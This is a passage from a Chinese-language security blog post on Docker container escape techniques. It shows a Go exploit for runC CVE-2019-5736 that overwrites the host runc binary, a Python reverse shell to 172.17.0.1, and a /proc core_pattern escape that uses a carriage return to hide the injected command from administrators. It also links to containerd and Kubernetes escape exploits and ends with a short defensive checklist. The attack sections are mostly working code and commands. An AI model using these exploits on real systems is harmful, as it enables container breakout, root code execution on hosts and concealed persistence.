&#125;</span><br><span class="line">	fmt.Fprintln(fd, <span class="string">&quot;#!/proc/self/exe&quot;</span>)</span><br><span class="line">	err = fd.Close()</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Println(err)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	fmt.Println(<span class="string">&quot;[+] Overwritten /bin/sh successfully&quot;</span>)</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Loop through all processes to find one whose cmdline includes runcinit</span></span><br><span class="line">	<span class="comment">// This will be the process created by runc</span></span><br><span class="line">	<span class="keyword">var</span> found <span class="type">int</span></span><br><span class="line">	<span class="keyword">for</span> found == <span class="number">0</span> &#123;</span><br><span class="line">		pids, err := ioutil.ReadDir(<span class="string">&quot;/proc&quot;</span>)</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">			fmt.Println(err)</span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">for</span> _, f := <span class="keyword">range</span> pids &#123;</span><br><span class="line">			fbytes, _ := ioutil.ReadFile(<span class="string">&quot;/proc/&quot;</span> + f.Name() + <span class="string">&quot;/cmdline&quot;</span>)</span><br><span class="line">			fstring := <span class="type">string</span>(fbytes)</span><br><span class="line">			<span class="keyword">if</span> strings.Contains(fstring, <span class="string">&quot;runc&quot;</span>) &#123;</span><br><span class="line">				fmt.Println(<span class="string">&quot;[+] Found the PID:&quot;</span>, f.Name())</span><br><span class="line">				found, err = strconv.Atoi(f.Name())</span><br><span class="line">				<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">					fmt.Println(err)</span><br><span class="line">					<span class="keyword">return</span></span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// We will use the pid to get a file handle for runc on the host.</span></span><br><span class="line">	<span class="keyword">var</span> handleFd = <span class="number">-1</span></span><br><span class="line">	<span class="keyword">for</span> handleFd == <span class="number">-1</span> &#123;</span><br><span class="line">		<span class="comment">// Note, you do not need to use the O_PATH flag for the exploit to work.</span></span><br><span class="line">		handle, _ := os.OpenFile(<span class="string">&quot;/proc/&quot;</span>+strconv.Itoa(found)+<span class="string">&quot;/exe&quot;</span>, os.O_RDONLY, <span class="number">0777</span>)</span><br><span class="line">		<span class="keyword">if</span> <span class="type">int</span>(handle.Fd()) &gt; <span class="number">0</span> &#123;</span><br><span class="line">			handleFd = <span class="type">int</span>(handle.Fd())</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	fmt.Println(<span class="string">&quot;[+] Successfully got the file handle&quot;</span>)</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Now that we have the file handle, lets write to the runc binary and overwrite it</span></span><br><span class="line">	<span class="comment">// It will maintain it&#x27;s executable flag</span></span><br><span class="line">	<span class="keyword">for</span> &#123;</span><br><span class="line">		writeHandle, _ := os.OpenFile(<span class="string">&quot;/proc/self/fd/&quot;</span>+strconv.Itoa(handleFd), os.O_WRONLY|os.O_TRUNC, <span class="number">0700</span>)</span><br><span class="line">		<span class="keyword">if</span> <span class="type">int</span>(writeHandle.Fd()) &gt; <span class="number">0</span> &#123;</span><br><span class="line">			fmt.Println(<span class="string">&quot;[+] Successfully got write handle&quot;</span>, writeHandle)</span><br><span class="line">			fmt.Println(<span class="string">&quot;[+] The command executed is&quot;</span> + payload)</span><br><span class="line">			writeHandle.Write([]<span class="type">byte</span>(payload))</span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>编译生成 payload，需要在 linux 中需要安装 go 环境 <code>yum install go</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">go bulid main.go</span><br></pre></td></tr></table></figure>
<p>将编译生成文件复制到 docker 中</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker cp main 78e0d8daa906:/home</span><br><span class="line">docker exec -it 78e0d8daa906 /bin/bash</span><br></pre></td></tr></table></figure>
<p>运行 main 文件，使用 nc 监听反弹的端口，等待启动 docker</p>
<blockquote>
<p>There are <strong>2</strong> use cases for the exploit. The first (which is what this repo is), is essentially a trap. An attacker would need to get command execution inside a container and start a malicious binary which would listen. When someone (attacker or victim) uses  <code>docker exec</code>  to get into the container, this will trigger the exploit which will allow code execution as root.</p>
</blockquote>
<p>在另外一个页面，启动 docker，运行 main 的页面会得到返回</p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221129110937154.png" alt="image-20221129110937154">`</p>
<p>描述的有些奇怪，可以去上面的 payload 的链接看看，里面有 video</p>
<p>由于容器服务缺陷导致的逃逸还包括 Docker cp CVE-2019-14271 和 Docker build code execution CVE-2019-13139，利用起来都具有一定的限制条件，具体原理和利用可参考：</p>
<p><span class="exturl" data-url="aHR0cHM6Ly9saW5rcy5qaWFuc2h1LmNvbS9nbz90bz1odHRwcyUzQSUyRiUyRnVuaXQ0Mi5wYWxvYWx0b25ldHdvcmtzLmNvbSUyRmRvY2tlci1wYXRjaGVkLXRoZS1tb3N0LXNldmVyZS1jb3B5LXZ1bG5lcmFiaWxpdHktdG8tZGF0ZS13aXRoLWN2ZS0yMDE5LTE0MjcxJTJG">https://unit42.paloaltonetworks.com/docker-patched-the-most-severe-copy-vulnerability-to-date-with-cve-2019-14271/</span><br>
<span class="exturl" data-url="aHR0cHM6Ly9saW5rcy5qaWFuc2h1LmNvbS9nbz90bz1odHRwcyUzQSUyRiUyRnN0YWFsZHJhYWQuZ2l0aHViLmlvJTJGcG9zdCUyRjIwMTktMDctMTYtY3ZlLTIwMTktMTMxMzktZG9ja2VyLWJ1aWxkJTJG">https://staaldraad.github.io/post/2019-07-16-cve-2019-13139-docker-build/</span></p>
<h3 id="8containerd逃逸-cve-2020-15257"><a class="markdownIt-Anchor" href="#8containerd逃逸-cve-2020-15257">#</a> 8.containerd 逃逸 - CVE-2020-15257</h3>
<p>containerd 是一个控制 runC 的守护进程，提供命令行客户端和 API。当在 docker 使用–net=host 参数启动且与宿主机共享 net namespace 时，docker 容器会暴露 containerd-shim 监听的 Unix 域套接字，攻击者可以绕过访问权限访问 containerd 的控制 API 直接操作 containerd-shim ，来控制容器，从而实现 Docker 容器逃逸。</p>
<p>exp: <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2Nkay10ZWFtL0NESy9yZWxlYXNlcw==">https://github.com/cdk-team/CDK/releases</span></p>
<h3 id="9挂载proc导致逃逸"><a class="markdownIt-Anchor" href="#9挂载proc导致逃逸">#</a> 9. 挂载 /proc 导致逃逸</h3>
<p>linux 中的 <code>/proc</code>  目录是一个伪文件系统，其中动态反应着系统内进程以及其他组件的状态。<br>
当 docker 启动时将 <code>/proc</code>  目录挂载到容器内部时可以实现逃逸。</p>
<p>通过文档可知， <code>/proc/sys/kernel/core_pattern</code>  文件是负责进程奔溃时内存数据转储的，当第一个字符是 <code>|</code>  管道符时，后面的的部分会以命令行的方式进行解析并运行。<br>
<span class="exturl" data-url="aHR0cHM6Ly9tYW43Lm9yZy9saW51eC9tYW4tcGFnZXMvbWFuNS9jb3JlLjUuaHRtbA==">https://man7.org/linux/man-pages/man5/core.5.html</span><br>
 并且由于容器共享主机内核的原因，这个命令是以宿主机的权限运行的。</p>
<p>由于管道符的原因，错误的数据可能会扰乱我们的命令，因此这里用 python 接受并且忽略错误数据。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python3</span><br><span class="line">import  os</span><br><span class="line">import pty</span><br><span class="line">import socket</span><br><span class="line">lhost = &quot;172.17.0.1&quot;</span><br><span class="line">lport = 10000</span><br><span class="line">def main():</span><br><span class="line">   s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">   s.connect((lhost, lport))</span><br><span class="line">   os.dup2(s.fileno(), 0)</span><br><span class="line">   os.dup2(s.fileno(), 1)</span><br><span class="line">   os.dup2(s.fileno(), 2)</span><br><span class="line">   os.putenv(&quot;HISTFILE&quot;, &#x27;/dev/null&#x27;)</span><br><span class="line">   pty.spawn(&quot;/bin/bash&quot;)</span><br><span class="line">   # os.remove(&#x27;/tmp/.x.py&#x27;)</span><br><span class="line">   s.close()</span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">   main()</span><br></pre></td></tr></table></figure>
<p>并且创建一个会抛出段错误的程序</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">int main(void)  &#123;</span><br><span class="line">   int *a  = NULL;</span><br><span class="line">   *a = 1;</span><br><span class="line">   return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>然后在 <code>core_pattern</code>  文件中写入运行反弹 shell 的命令（这里需要注意由于是以宿主机上的权限运行的，因此 python 的路径则也是 docker 目录的路径）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">host_path=`sed -n &#x27;s/.*\perdir=\([^,]*\).*/\1/p&#x27; /etc/mtab`</span><br><span class="line">echo -e &quot;|$host_path/tmp/.x.py \rcore    &quot; &gt;  /host-proc/sys/kernel/core_pattern</span><br></pre></td></tr></table></figure>
<p><code>\r</code>  之后的内容主要是为了为了管理员通过 <code>cat</code>  命令查看内容时隐蔽我们写入恶意命令。<br>
这样当我们运行 c 文件之后，就会抛出段错误，然后执行 <code>core_pattern</code>  中的命令（运行成功 <code>core_pattern</code>  时会有 <code>core dumped</code>  的输出）</p>
<h3 id="10k8s中挂载varlog"><a class="markdownIt-Anchor" href="#10k8s中挂载varlog">#</a> 10.k8s 中挂载 /var/log</h3>
<p>这里用单纯的挂载 <code>/var/log</code>  来形容这个逃逸的触发条件其实不太严谨，需要满足如下条件。</p>
<ul>
<li>挂载了 <code>/var/log</code></li>
<li>容器是在一个 k8s 的环境中</li>
<li>当前 pod 的 serviceaccount 拥有 get|list|watch log 的权限</li>
</ul>
<p>类似于赋予了当前 pod 一个读取日志的能力。<br>
当满足以上条件时，可以与 node 节点的 10250 端口进行通信，并通过软链接的方式读取 node 上的文件。</p>
<p>exp:<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2RhbmllbHNhZ2kva3ViZS1wb2QtZXNjYXBl">https://github.com/danielsagi/kube-pod-escape</span></p>
<h2 id="防御docker逃逸"><a class="markdownIt-Anchor" href="#防御docker逃逸">#</a> 防御 docker 逃逸</h2>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1、更新Docker版本到19.03.1及更高版本——CVE-2019-14271、覆盖CVE-2019-5736</span><br><span class="line">2、runc版本 &gt; 1.0-rc6</span><br><span class="line">3、k8s 集群版本&gt;1.12</span><br><span class="line">4、Linux内核版本&gt;=2.6.22——CVE-2016-5195(脏牛)</span><br><span class="line">5、Linux内核版本&gt;=4.14——CVE-2017–1000405(大脏牛)，未找到docker逃逸利用过程，但存在逃逸风险</span><br><span class="line">6、不建议以root权限运行Docker服务</span><br><span class="line">7、不建议以privileged（特权模式）启动Docker</span><br><span class="line">8、不建议将宿主机目录挂载至容器目录</span><br><span class="line">9、不建议将容器以—cap-add=SYSADMIN启动，SYSADMIN意为container进程允许执行mount、umount等一系列系统管理操作，存在容器逃逸风险</span><br></pre></td></tr></table></figure>
<p><span class="exturl" data-url="aHR0cHM6Ly96b25lLmh1b3hpYW4uY24vZC8xMDM0LWRvY2tlci8y">Docker 实现原理 - 火线 Zone - 云安全社区 (huoxian.cn)</span></p>
<p><span class="exturl" data-url="aHR0cHM6Ly9jbG91ZC50ZW5jZW50LmNvbS9kZXZlbG9wZXIvYXJ0aWNsZS8xOTg3NzI1">浅析 docker 的多种逃逸方法 - 腾讯云开发者社区 - 腾讯云 (tencent.com)</span></p>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cua2luZ2trLmNvbS8yMDIxLzAxLyVFOSU4NSU4RCVFNyVCRCVBRSVFNCVCOCU4RCVFNSVCRCU5MyVFNSVBRiVCQyVFOCU4NyVCNCVFNyU5QSU4NCVFNSVBRSVCOSVFNSU5OSVBOCVFOSU4MCU4MyVFOSU4MCVCOC8=">配置不当导致的容器逃逸 - Kingkk’s Blog</span></p>
<p><a target="_blank" rel="noopener" href="https://m01ly.github.io/2022/01/04/pt-docker-escape/#3-2-%E5%AE%B9%E5%99%A8%E6%8C%82%E8%BD%BD%E4%B8%8D%E5%BD%93">(<em>´∇｀</em>)~ docker 逃逸常用方法 | Hexo (m01ly.github.io)</a></p>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cuZnJlZWJ1Zi5jb20vYXJ0aWNsZXMvY29udGFpbmVyLzI0Mjc2My5odG1s">初识 Docker 逃逸 - FreeBuf 网络安全行业门户</span></p>
<p><span class="exturl" data-url="aHR0cHM6Ly95eXo5LmNuLzIwMjIvMDMvMjIvZG9ja2VyJUU5JTgwJTgzJUU5JTgwJUI4JUU2JTgwJTlEJUU4JUI3JUFGJUU2JTgwJUJCJUU3JUJCJTkzLw==">Docker 逃逸思路总结 &amp;&amp; 复现 – yyz の blog (yyz9.cn)</span></p>

  </div>

   <footer>

    <div class="meta">
  <span class="item">
    <span class="icon">
      <i class="ic i-calendar-check"></i>
    </span>
    <span class="text">Edited on</span>
    <time title="Modified: 2022-12-01 19:36:51" itemprop="dateModified" datetime="2022-12-01T19:36:51+08:00">2022-12-01</time>
  </span>
</div>

      
<div class="reward">
  <button><i class="ic i-heartbeat"></i> Donate</button>
  <p>Give me a cup of [coffee]~(￣▽￣)~*</p>
  <div id="qr">
      
      <div>
        <img data-src="/images/wechatpay.png" alt="John Doe WeChat Pay">
        <p>WeChat Pay</p>
      </div>
      
      <div>
        <img data-src="/images/alipay.png" alt="John Doe Alipay">
        <p>Alipay</p>
      </div>
      
      <div>
        <img data-src="/images/paypal.png" alt="John Doe PayPal">
        <p>PayPal</p>
      </div>
  </div>
</div>

      

<div id="copyright">
<ul>
  <li class="author">
    <strong>Post author:  </strong>John Doe <i class="ic i-at"><em>@</em></i>Hexo
  </li>
  <li class="link">
    <strong>Post link: </strong>
    <a href="http://example.com/2022/11/27/Docker%E9%80%83%E9%80%B8/" title="docker逃逸&amp;capabilities">http://example.com/2022/11/27/Docker逃逸/</a>
  </li>
  <li class="license">
    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</span> unless stating additionally.
  </li>
</ul>
</div>

  </footer>

</article>

  </div>
  

<div class="post-nav">
    <div class="item left">
      

  <a href="/2022/11/17/JWT%20%E5%9F%BA%E7%A1%80/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;tva2.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1gipev1x5e4j20zk0m8b29.jpg" title="JWT">
  <span class="type">Previous Post</span>
  <span class="category"><i class="ic i-flag"></i> web安全</span>
  <h3>JWT</h3>
  </a>

    </div>
    <div class="item right">
      

  <a href="/2022/11/27/CDN/" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;tva2.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1giph4baakhj20zk0m8h5q.jpg" title="CDN&amp;DNS">
  <span class="type">Next Post</span>
  <span class="category"><i class="ic i-flag"></i> web安全</span>
  <h3>CDN&DNS</h3>
  </a>

    </div>
</div>

  
  <div class="wrap" id="comments"></div>


        </div>
        <div id="sidebar">
          

<div class="inner">

  <div class="panels">
    <div class="inner">
      <div class="contents panel pjax" data-title="Contents">
          <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#docker%E9%80%83%E9%80%B8-%E5%8F%8D%E5%BC%B9shellcapabilities"><span class="toc-number">1.</span> <span class="toc-text"> Docker 逃逸、反弹 shell，capabilities</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="toc-number">1.1.</span> <span class="toc-text"> 前置知识</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1linux-namespace"><span class="toc-number">1.1.1.</span> <span class="toc-text"> 1.Linux NameSpace</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2linux-cgroup"><span class="toc-number">1.1.2.</span> <span class="toc-text"> 2.Linux Cgroup</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3%E7%89%B9%E6%9D%83%E6%A8%A1%E5%BC%8F"><span class="toc-number">1.1.3.</span> <span class="toc-text"> 3. 特权模式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4docker-%E7%8E%AF%E5%A2%83%E5%88%A4%E6%96%AD"><span class="toc-number">1.1.4.</span> <span class="toc-text"> 4.docker 环境判断</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5%E7%89%B9%E6%9D%83%E6%A8%A1%E5%BC%8F%E5%88%A4%E6%96%AD"><span class="toc-number">1.1.5.</span> <span class="toc-text"> 5. 特权模式判断</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6linux-capabilities-%E8%A1%A5%E5%85%85"><span class="toc-number">1.1.6.</span> <span class="toc-text"> 6.Linux Capabilities （补充）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7%E5%8F%8D%E5%BC%B9shell%E8%A1%A5%E5%85%85"><span class="toc-number">1.1.7.</span> <span class="toc-text"> 7. 反弹 shell (补充)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#docker-%E9%80%83%E9%80%B8"><span class="toc-number">1.2.</span> <span class="toc-text"> docker 逃逸</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1docker-daemon-api%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE"><span class="toc-number">1.2.1.</span> <span class="toc-text"> 1.docker daemon api 未授权访问</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2docker-%E7%89%B9%E6%9D%83%E9%80%83%E9%80%B8"><span class="toc-number">1.2.2.</span> <span class="toc-text"> 2.docker 特权逃逸</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3%E6%8C%82%E8%BD%BDdockersock"><span class="toc-number">1.2.3.</span> <span class="toc-text"> 3. 挂载 docker.sock</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4%E6%8C%82%E8%BD%BD%E5%AE%BF%E4%B8%BB%E6%9C%BA%E6%A0%B9%E7%9B%AE%E5%BD%95"><span class="toc-number">1.2.4.</span> <span class="toc-text"> 4. 挂载宿主机根目录</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-cgroup%E6%89%A7%E8%A1%8C%E5%AE%BF%E4%B8%BB%E6%9C%BA%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4"><span class="toc-number">1.2.5.</span> <span class="toc-text"> 5、Cgroup 执行宿主机系统命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6dirty-cow-%E6%BC%8F%E6%B4%9E%E9%80%83%E9%80%B8"><span class="toc-number">1.2.6.</span> <span class="toc-text"> 6.Dirty Cow 漏洞逃逸</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7runc%E9%80%83%E9%80%B8-cve-2019-5736"><span class="toc-number">1.2.7.</span> <span class="toc-text"> 7.runC 逃逸 - CVE-2019-5736</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8containerd%E9%80%83%E9%80%B8-cve-2020-15257"><span class="toc-number">1.2.8.</span> <span class="toc-text"> 8.containerd 逃逸 - CVE-2020-15257</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#9%E6%8C%82%E8%BD%BDproc%E5%AF%BC%E8%87%B4%E9%80%83%E9%80%B8"><span class="toc-number">1.2.9.</span> <span class="toc-text"> 9. 挂载 &#x2F;proc 导致逃逸</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#10k8s%E4%B8%AD%E6%8C%82%E8%BD%BDvarlog"><span class="toc-number">1.2.10.</span> <span class="toc-text"> 10.k8s 中挂载 &#x2F;var&#x2F;log</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1docker%E9%80%83%E9%80%B8"><span class="toc-number">1.3.</span> <span class="toc-text"> 防御 docker 逃逸</span></a></li></ol></li></ol>
      </div>
      <div class="related panel pjax" data-title="Related">
        <ul>
          <li><a href="/2022/02/17/XSS/" rel="bookmark" title="XSS">XSS</a></li><li><a href="/2022/03/16/SQL%E6%B3%A8%E5%85%A5/" rel="bookmark" title="SQL injection">SQL injection</a></li><li><a href="/2022/04/16/Upload/" rel="bookmark" title="File upload">File upload</a></li><li><a href="/2022/05/17/include/" rel="bookmark" title="file include">file include</a></li><li><a href="/2022/05/27/CSRF/" rel="bookmark" title="CSRF">CSRF</a></li><li><a href="/2022/06/27/SSRF/" rel="bookmark" title="SSRF">SSRF</a></li><li><a href="/2022/08/16/Unserialize/" rel="bookmark" title="unserialize">unserialize</a></li><li><a href="/2022/11/17/JWT%20%E5%9F%BA%E7%A1%80/" rel="bookmark" title="JWT">JWT</a></li><li><a href="/2022/11/27/CDN/" rel="bookmark" title="CDN&DNS">CDN&DNS</a></li><li class="active"><a href="/2022/11/27/Docker%E9%80%83%E9%80%B8/" rel="bookmark" title="docker逃逸&capabilities">docker逃逸&capabilities</a></li><li><a href="/2022/12/27/SSTI/" rel="bookmark" title="SSTI">SSTI</a></li><li><a href="/2022/12/31/webshell/" rel="bookmark" title="webshell">webshell</a></li>
        </ul>
      </div>
      <div class="overview panel" data-title="Overview">
        <div class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <img class="image" itemprop="image" alt="John Doe"
      data-src="/images/avatar.jpg">
  <p class="name" itemprop="name">John Doe</p>
  <div class="description" itemprop="description"></div>
</div>

<nav class="state">
    <div class="item posts">
      <a href="/archives/">
        <span class="count">20</span>
        <span class="name">posts</span>
      </a>
    </div>
    <div class="item categories">
      <a href="/categories/">
        <span class="count">4</span>
        <span class="name">categories</span>
      </a>
    </div>
    <div class="item tags">
      <a href="/tags/">
        <span class="count">5</span>
        <span class="name">tags</span>
      </a>
    </div>
</nav>

<div class="social">
</div>

<ul class="menu">
  
    
  <li class="item">
    <a href="/" rel="section"><i class="ic i-home"></i>Home</a>
  </li>


</ul>

      </div>
    </div>
  </div>

  <ul id="quick">
    <li class="prev pjax">
        <a href="/2022/11/17/JWT%20%E5%9F%BA%E7%A1%80/" rel="prev" title="Previous Post"><i class="ic i-chevron-left"></i></a>
    </li>
    <li class="up"><i class="ic i-arrow-up"></i></li>
    <li class="down"><i class="ic i-arrow-down"></i></li>
    <li class="next pjax">
        <a href="/2022/11/27/CDN/" rel="next" title="Next Post"><i class="ic i-chevron-right"></i></a>
    </li>
    <li class="percent"></li>
  </ul>
</div>


        </div>
        <div class="dimmer"></div>
      </div>
    </main>
    <footer id="footer">
      <div class="inner">
        <div class="widgets">
          
<div class="rpost pjax">
  <h2>Random Posts</h2>
  <ul>
      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/%E7%A7%8B%E6%8B%9B/" title="In 秋招">秋招</a>
</div>

    <span><a href="/2022/10/28/%E7%A7%8B%E6%8B%9B%E9%9D%A2%E8%AF%95%E9%A2%98/" title="秋招面试题">秋招面试题</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/%E7%A7%8B%E6%8B%9B/" title="In 秋招">秋招</a>
</div>

    <span><a href="/2022/10/27/%E7%A7%8B%E6%8B%9B%E6%80%BB%E7%BB%93/" title="秋招总结">秋招总结</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/web%E5%AE%89%E5%85%A8/" title="In web安全">web安全</a>
</div>

    <span><a href="/2022/12/27/SSTI/" title="SSTI">SSTI</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
</div>

    <span><a href="/2022/12/28/mysql/" title="Mysql">Mysql</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/web%E5%AE%89%E5%85%A8/" title="In web安全">web安全</a>
</div>

    <span><a href="/2022/02/17/XSS/" title="XSS">XSS</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/web%E5%AE%89%E5%85%A8/" title="In web安全">web安全</a>
</div>

    <span><a href="/2022/11/27/Docker%E9%80%83%E9%80%B8/" title="docker逃逸&amp;capabilities">docker逃逸&capabilities</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/web%E5%AE%89%E5%85%A8/" title="In web安全">web安全</a>
</div>

    <span><a href="/2022/05/27/CSRF/" title="CSRF">CSRF</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/web%E5%AE%89%E5%85%A8/" title="In web安全">web安全</a>
</div>

    <span><a href="/2022/11/27/CDN/" title="CDN&amp;DNS">CDN&DNS</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/web%E5%AE%89%E5%85%A8/" title="In web安全">web安全</a>
</div>

    <span><a href="/2022/08/16/Unserialize/" title="unserialize">unserialize</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/%E5%86%85%E7%BD%91/" title="In 内网">内网</a>
</div>

    <span><a href="/2022/12/25/%E5%86%85%E7%BD%91/" title="内网渗透">内网渗透</a></span>
  </li>

  </ul>
</div>
<div>
  <h2>Recent Comments</h2>
  <ul class="leancloud-recent-comment"></ul>
</div>

        </div>
        <div class="status">
  <div class="copyright">
    
    &copy; 2010 – 
    <span itemprop="copyrightYear">2022</span>
    <span class="with-love">
      <i class="ic i-sakura rotate"></i>
    </span>
    <span class="author" itemprop="copyrightHolder">John Doe @ Yume Shoka</span>
  </div>
  <div class="powered-by">
    Powered by <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & Theme.<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FtZWhpbWUvaGV4by10aGVtZS1zaG9rYQ==">Shoka</span>
  </div>
</div>

      </div>
    </footer>
  </div>
<script data-config type="text/javascript">
  var LOCAL = {
    path: '2022/11/27/Docker逃逸/',
    favicon: {
      show: "（●´3｀●）Goooood",
      hide: "(´Д｀)Booooom"
    },
    search : {
      placeholder: "Search for Posts",
      empty: "We didn't find any results for the search: ${query}",
      stats: "${hits} results found in ${time} ms"
    },
    valine: true,fancybox: true,
    copyright: 'Copied to clipboard successfully! <br> All articles in this blog are licensed under <i class="ic i-creative-commons"></i>BY-NC-SA.',
    ignores : [
      function(uri) {
        return uri.includes('#');
      },
      function(uri) {
        return new RegExp(LOCAL.path+"$").test(uri);
      }
    ]
  };
</script>

<script src="https://cdn.polyfill.io/v2/polyfill.js"></script>

<script src="//cdn.jsdelivr.net/combine/npm/pace-js@1.0.2/pace.min.js,npm/pjax@0.2.8/pjax.min.js,npm/whatwg-fetch@3.4.0/dist/fetch.umd.min.js,npm/animejs@3.2.0/lib/anime.min.js,npm/algoliasearch@4/dist/algoliasearch-lite.umd.js,npm/instantsearch.js@4/dist/instantsearch.production.min.js,npm/lozad@1/dist/lozad.min.js,npm/quicklink@2/dist/quicklink.umd.js"></script>

<script src="/js/app.js?v=0.2.5"></script>




</body>
</html>
